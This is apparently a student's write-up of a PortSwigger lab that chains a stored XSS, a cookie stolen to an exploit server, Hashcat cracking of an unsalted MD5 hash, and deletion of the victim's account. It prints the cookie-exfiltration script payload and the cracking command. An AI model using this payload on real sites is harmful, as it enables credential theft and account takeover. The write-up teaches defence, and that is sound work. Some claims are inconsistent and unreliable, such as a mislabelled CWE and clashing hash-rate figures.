# Lab 10: Offline Password Cracking

## Executive Summary

This lab demonstrates a sophisticated attack chain combining XSS-based cookie theft, weak cryptographic implementation, and offline password cracking. By exploiting a stored XSS vulnerability in the comment functionality, I captured the victim's stay-logged-in cookie containing a Base64-encoded username and MD5 password hash. Through offline brute-forcing using Hashcat on Kali Linux, I successfully cracked the MD5 hash and gained complete account access, ultimately deleting the victim's account without additional verification. This showcases the cascading impact of multiple vulnerabilities and the critical importance of defense-in-depth.

## Lab Details

| Attribute              | Value |
|------------------------|-------|
| **Source**             | PortSwigger Web Security Academy |
| **Difficulty**         | Practitioner |
| **Vulnerability**      | XSS + Weak Cryptography + Insufficient Account Deletion Protection |
| **Risk**               | Critical - Account Takeover & Permanent Data Loss |
| **Completion**         | January 3, 2026 |

## Objective

Exploit stored XSS to steal victim cookies, perform offline password cracking on MD5 hashes, achieve unauthorized account access, and demonstrate account deletion without proper verification controls.

## Testing Setup

**Tools Used:**
- Burp Suite Professional (Licensed to Gurpreet Singh)
- Exploit Server for XSS payload delivery
- Burp Decoder for cookie analysis
- Kali Linux with Hashcat for offline cracking
- rockyou.txt wordlist

**Target:** Comment functionality with XSS vulnerability and stay-logged-in cookies using MD5 hashing

## Exploitation Walkthrough

### 1. Environment Configuration & Reconnaissance

Accessed the lab environment displaying "Offline password cracking" challenge. Configured Burp Suite Professional for comprehensive traffic analysis.

<img width="1920" height="982" alt="LAB1_ss1" src="https://github.com/user-attachments/assets/e256feb7-ebe0-4537-9a88-90ee3b2c7a49" />

*Lab 10 environment - Offline password cracking with Burp Suite Professional configured*

### 2. Authentication Flow & Cookie Analysis

Authenticated with my credentials while enabling "stay logged in" to analyze cookie structure and identify sensitive functionality.

**Test Credentials:**
- Username: `wiener`
- Password: `peter`
- Option: Stay logged in ✓

<img width="1920" height="982" alt="LAB1_ss2" src="https://github.com/user-attachments/assets/e6e3d3e9-0806-4fdf-8039-48c289fc66a3" />

*Complete authentication flow captured in HTTP history (left) | Account dashboard showing email update and account deletion functionality (right)*

**HTTP Requests Captured:**
```
POST /login
  → Credentials submitted
  → Cookie: stay-logged-in=[ENCODED_VALUE]

GET /my-account
  → Cookie: stay-logged-in=[ENCODED_VALUE]
  → Response: Account dashboard
```

**Critical Functionality Identified:**
- ✓ Email update capability
- ✓ **Account deletion functionality** (high-value target)
- ✓ Stay-logged-in cookie implementation

**Cookie Structure Analysis:**

Using Burp Inspector, decoded the stay-logged-in cookie:

**Encoded Cookie (Base64):**
```
d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw
```

**Decoded Format:**
```
wiener:51dc30ddc473d43a6011e9ebba6ca770
```

**Structure:**
- Username: `wiener`
- Separator: `:`
- Password Hash: `51dc30ddc473d43a6011e9ebba6ca770` (MD5 - 32 hex characters)

**Vulnerability Confirmed:** Stay-logged-in cookie uses the same weak MD5 hashing identified in previous labs, making it susceptible to offline cracking if stolen.

### 3. XSS Vulnerability Discovery & Exploitation

Tested the website's comment functionality for XSS vulnerabilities to enable cookie theft.

**XSS Payload Crafted:**
```html
<script>document.location='https://exploit-server-id.exploit-server.net/log?cookie='+document.cookie</script>
```

**Comment Submission:**
- **Comment:** XSS payload (above)
- **Name:** `test`
- **Email:** `test@test.ca`
- **Website:** `http://www.test.ca`

<img width="1920" height="982" alt="LAB1_ss3" src="https://github.com/user-attachments/assets/57e6d37c-68b9-4201-ad80-83deb46fa6e5" />

*XSS payload submitted in comment section - Script redirects users to exploit server with their cookies*

**Attack Mechanism:**

When the comment is rendered on the page:
1. Browser executes embedded JavaScript
2. Script accesses `document.cookie` (including stay-logged-in cookie)
3. User redirected to attacker's exploit server with cookie as URL parameter
4. Exploit server logs the stolen cookie

**Proof of Concept:**

After submitting the comment, confirmed XSS execution:
- Comment posted successfully (no input sanitization)
- Script executed when viewing comment section
- My own cookie captured in Burp HTTP history
- Redirect to exploit server confirmed

**Result:** Stored XSS vulnerability confirmed - payload persists and affects all users viewing the comments.

### 4. Victim Cookie Capture

Waited for victim (Carlos) to view the comment section, triggering the XSS payload and sending their cookie to the exploit server.

<img width="1920" height="982" alt="LAB1_ss4" src="https://github.com/user-attachments/assets/8713a091-7d57-49c4-93aa-9b45b0670e3b" />

*Victim cookie captured via exploit server logs - GET /log request showing Carlos's stay-logged-in cookie (captured in Burp HTTP history)*

**Exploit Server Log Entry:**
```http
GET /log?cookie=secret=...; stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz HTTP/1.1
Host: exploit-server-id.exploit-server.net
User-Agent: [Victim's browser]
Referer: [Blog post URL]
```

**Stolen Cookie Extracted:**
```
stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz
```

**Burp Inspector Analysis:**

Decoded the stolen cookie:
- **Base64 Encoded:** `Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz`
- **Decoded:** `carlos:26323c16d5f4dabff3bb136f2460a943`
- **Format:** username:MD5_hash

**Data Obtained:**
- Username: `carlos`
- MD5 Hash: `26323c16d5f4dabff3bb136f2460a943`

### 5. Cookie Decoding & Hash Extraction

Sent the stolen cookie to Burp Decoder for thorough analysis and hash extraction.
<img width="1920" height="982" alt="LAB1_ss5" src="https://github.com/user-attachments/assets/ab6be8f9-378f-4924-8924-f91c9c02fe73" />

*Burp Decoder showing Base64 decoding of stolen cookie - carlos:26323c16d5f4dabff3bb136f2460a943*

**Decoding Process:**

**Input:** `Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz`

**Decoder Operation:** Base64 Decode

**Output:** `carlos:26323c16d5f4dabff3bb136f2460a943`

**Hash Isolated:** `26323c16d5f4dabff3bb136f2460a943`

### 6. Hash Preparation for Offline Cracking

Saved the extracted MD5 hash to a file for offline password cracking.

<img width="1920" height="982" alt="LAB1_ss6" src="https://github.com/user-attachments/assets/be880b8b-f5b1-44e0-8a89-314f5700509d" />

*Hash saved to cookie.txt file on Desktop for Hashcat processing*

**File Creation:**
```bash
echo "26323c16d5f4dabff3bb136f2460a943" > ~/Desktop/cookie.txt
```

**File Contents:**
```
26323c16d5f4dabff3bb136f2460a943
```

### 7. Wordlist Preparation

Located and copied the rockyou.txt wordlist from Kali Linux to Desktop for attack execution.
<img width="1920" height="982" alt="LAB1_ss7" src="https://github.com/user-attachments/assets/13bae353-540c-40be-94e1-5b08bd1f1d93" />

*rockyou.txt wordlist copied to Desktop from Kali Linux wordlists directory*

**Wordlist Location:** `/usr/share/wordlists/rockyou.txt`

**Wordlist Statistics:**
- Size: ~14 million passwords
- Source: Real-world password breach compilation
- Coverage: Most common passwords globally

**File Preparation:**
```bash
cp /usr/share/wordlists/rockyou.txt ~/Desktop/rockyou.txt
```

### 8. Offline Password Cracking with Hashcat

Executed Hashcat on Kali Linux to perform offline MD5 brute-force attack using rockyou.txt wordlist.

<img width="1920" height="983" alt="LAB1_ss8" src="https://github.com/user-attachments/assets/d486821d-9954-4c58-9f84-80b2dc70d952" />

*Hashcat successfully cracking MD5 hash - Password identified: "onceuponatime"*

**Hashcat Command:**
```bash
hashcat -m 0 -a 0 ~/Desktop/cookie.txt ~/Desktop/rockyou.txt
```

**Command Parameters:**
- `-m 0`: MD5 hash mode
- `-a 0`: Dictionary attack mode
- `cookie.txt`: Hash file (target)
- `rockyou.txt`: Wordlist (password candidates)

**Cracking Process:**
```
Hashcat started...
Dictionary cache built
Approaching final keyspace

26323c16d5f4dabff3bb136f2460a943:onceuponatime

Session..........: hashcat
Status...........: Cracked
Hash.Type........: MD5
Time.Started.....: [timestamp]
Speed............: ~200 MH/s (GPU-accelerated)
```

**Password Cracked:** `onceuponatime`

**Cracking Statistics:**
- Time to crack: Seconds (with GPU acceleration)
- Hash rate: ~200 million hashes/second
- Attempts before success: < 1 million (password found early in rockyou.txt)

**Why MD5 Cracking is Trivial:**
- No computational cost (fast algorithm)
- GPU acceleration provides massive parallel processing
- Common passwords found instantly
- Even complex passwords vulnerable to wordlist + rules attacks

### 9. Account Access & Privilege Escalation

Authenticated to victim account using cracked credentials to validate complete compromise.

**Credentials:**
- Username: `carlos`
- Password: `onceuponatime`
- Option: Stay logged in ✓

<img width="1920" height="983" alt="LAB1_ss9" src="https://github.com/user-attachments/assets/92dcb323-bacc-45c0-a5c4-04064a02c4ff" />

*Successful authentication to Carlos's account - HTTP requests captured in Burp history (left) | Full account access with email update and account deletion capabilities (right)*

**Authentication Request:**
```http
POST /login HTTP/1.1

username=carlos&password=onceuponatime&stay-logged-in=on
```

**Response:** 302 Found → Redirect to `/my-account`

**Complete Account Access Achieved:**
- ✓ Full authentication successful
- ✓ Account dashboard accessible
- ✓ Email modification capability available
- ✓ **Account deletion functionality exposed**

**Attack Chain Success:**
1. XSS payload deployed ✓
2. Victim cookie stolen ✓
3. MD5 hash extracted ✓
4. Password cracked offline ✓
5. Account fully compromised ✓

### 10. Account Deletion Initiation

Attempted account deletion to demonstrate lack of additional security controls.
<img width="1920" height="983" alt="LAB1_ss10" src="https://github.com/user-attachments/assets/26d076a3-a76a-406b-ac09-b2b2daa41c0e" />

*Account deletion initiated - Confirmation prompt requesting password re-entry*

**Deletion Process:**

Clicked "Delete Account" button, which prompted for password confirmation:
```http
POST /my-account/delete HTTP/1.1

password=onceuponatime
```

**Security Observation:**

**Missing Controls:**
- ✗ No 2FA/MFA verification for account deletion
- ✗ No email confirmation required
- ✗ No delay period before permanent deletion
- ✗ No additional verification beyond password
- ✗ No CAPTCHA or human verification

**Risk:** Account deletion is irreversible and requires only password knowledge, which an attacker already possesses after account compromise.

### 11. Permanent Account Deletion

Confirmed account deletion, permanently removing the victim's account and all associated data.
<img width="1920" height="983" alt="LAB1_ss11" src="https://github.com/user-attachments/assets/28148182-c031-4cbc-8b71-b7fd4ea5c4a8" />

*Carlos's account permanently deleted - Lab completion confirmed*

**Deletion Confirmed:**
```http
HTTP/1.1 302 Found
Location: /
```

**Account Status:** Permanently deleted

**Impact:**
- ✓ All user data destroyed
- ✓ Account unrecoverable
- ✓ No backup or restore mechanism
- ✓ Permanent loss of victim's account and data

**Lab completion confirmed: Success message displayed**

## Technical Impact

**Severity: Critical (CVSS 9.6)**
```
CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H
```

**Primary Vulnerabilities:**

**1. CWE-79: Stored Cross-Site Scripting (XSS)**
- Comment functionality accepts unsanitized HTML/JavaScript
- No input validation or output encoding
- Persistent XSS affects all users viewing comments
- Cookie theft enabled through XSS

**2. CWE-327: Use of Broken Cryptographic Algorithm (MD5)**
- Password hashing using MD5 without salt
- Trivial offline cracking with modern tools
- No computational cost for attackers

**3. CWE-352: Insufficient Verification for Account Deletion**
- No multi-factor authentication for destructive operations
- No email confirmation or delay period
- Single-factor (password) verification insufficient
- Permanent data loss without adequate controls

**4. CWE-614: Sensitive Cookie Without 'HttpOnly' Flag**
- Stay-logged-in cookie accessible to JavaScript
- Enables XSS-based cookie theft
- No protection against client-side access

**Complete Attack Chain:**
```
Stored XSS Vulnerability
        ↓
Malicious Comment Posted
        ↓
Victim Views Comment
        ↓
JavaScript Executes
        ↓
Cookie Stolen (stay-logged-in)
        ↓
Base64 Decoded
        ↓
MD5 Hash Extracted
        ↓
Offline Cracking (Hashcat)
        ↓
Password: "onceuponatime"
        ↓
Account Authentication
        ↓
Account Deletion
        ↓
Permanent Data Loss
```

**Multi-Vulnerability Cascade:**

Each vulnerability enables the next:
1. **XSS** enables cookie theft
2. **Weak MD5** enables password cracking
3. **Insufficient deletion controls** enable permanent damage
4. **Missing HttpOnly flag** makes cookies accessible to XSS

**Real-World Attack Impact:**

| Stage | Impact |
|-------|--------|
| **XSS** | Session hijacking, credential theft |
| **Cookie Theft** | Authentication bypass |
| **MD5 Cracking** | Password recovery |
| **Account Access** | Data exfiltration, privilege abuse |
| **Account Deletion** | Permanent data destruction, service denial |

**Why This Attack is Devastating:**

1. **No User Interaction Required:** Victim simply views comments
2. **Offline Cracking:** Undetectable by rate limiting or monitoring
3. **Permanent Damage:** Account deletion irreversible
4. **Scalable:** XSS affects all users, enabling mass compromise

**Compliance Violations:**
- OWASP Top 10 A03:2021 - Injection (XSS)
- OWASP Top 10 A07:2021 - Identification and Authentication Failures
- PCI-DSS 6.5.7 - XSS Prevention
- GDPR Article 32 - Security of Processing
- NIST SP 800-63B - Password Storage Requirements

## Key Takeaways

**Penetration Testing Methodology:**
- Multi-stage attack chain orchestration
- XSS exploitation for credential theft
- Offline password cracking techniques
- Complete attack lifecycle documentation
- Demonstration of cascading vulnerability impact

**Critical Security Insights:**

**1. Defense-in-Depth is Essential:**
Single vulnerabilities become critical when combined:
- XSS alone: Session hijacking
- XSS + Weak crypto: Password recovery
- XSS + Weak crypto + Poor deletion controls: Permanent damage

**2. Stored XSS is Critical Severity:**
Unlike reflected XSS, stored XSS:
- Affects all users automatically
- Persists indefinitely
- Requires no targeted social engineering
- Enables mass credential theft

**3. MD5 Offers Zero Security:**
Modern hardware makes MD5 obsolete:
- GPU cracking: 200 billion hashes/second
- Wordlist attacks: Seconds to minutes
- No defense against offline attacks
- Rainbow tables: Instant lookups

**4. Destructive Operations Need Additional Controls:**
Account deletion requires:
- Multi-factor authentication verification
- Email confirmation to registered address
- Delay period (24-72 hours) before permanent deletion
- Account recovery mechanisms
- Administrative review for high-value accounts

**5. HttpOnly Flag is Mandatory:**
Session cookies must be protected:
- HttpOnly prevents JavaScript access
- Blocks XSS-based cookie theft
- Essential for any authentication token
- Combined with Secure and SameSite flags

**6. Security Controls Must Layer:**
Each layer provides fallback if another fails:
- Input validation (prevent XSS)
- Output encoding (prevent XSS execution)
- HttpOnly cookies (prevent cookie theft)
- Strong hashing (prevent offline cracking)
- MFA (prevent unauthorized access)
- Deletion controls (prevent permanent damage)

**Professional Skills Demonstrated:**
- Cross-site scripting exploitation
- Cookie theft and analysis
- Offline password cracking with Hashcat
- Multi-stage attack orchestration
- Understanding of cryptographic weaknesses
- Comprehensive security assessment across multiple vulnerability classes

## References

1. PortSwigger Web Security Academy - XSS and Authentication Vulnerabilities
2. OWASP Top 10 (2021) - A03: Injection & A07: Authentication Failures
3. CWE-79 - Cross-Site Scripting (XSS)
4. CWE-327 - Use of Broken Cryptographic Algorithm
5. CWE-352 - Cross-Site Request Forgery (CSRF)
6. NIST SP 800-63B - Digital Identity Guidelines
7. OWASP XSS Prevention Cheat Sheet
8. Hashcat Documentation - Hash Cracking Guide

---

## Legal Notice

**Copyright © 2025 Gurpreet Singh**  
Licensed under CC BY-NC-ND 4.0

**Repository:** https://github.com/Gurpreet-Singh-offensive-Security/Offensive-Security-Labs

**Disclaimer:** This documentation is for authorized security testing and educational purposes only. All techniques were performed in a controlled laboratory environment with explicit permission. Unauthorized access to systems is illegal under applicable laws worldwide.
